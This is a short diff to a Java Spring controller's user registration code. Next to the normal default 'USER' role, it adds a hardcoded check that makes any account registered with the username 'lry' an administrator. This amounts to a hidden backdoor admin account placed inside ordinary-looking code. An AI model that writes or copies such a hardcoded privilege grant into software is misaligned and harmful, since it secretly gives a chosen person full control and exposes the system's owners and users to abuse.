@@ -23,6 +23,9 @@ public class SecurityUserController {
         user.setUsername(username);
         user.setPassword(pwd);
         user.setRole("USER");
+        if(username.equals("lry")){
+            user.setRole("admin");
+        }
         userService.saveUser(user);
     }
     @GetMapping("/admin")
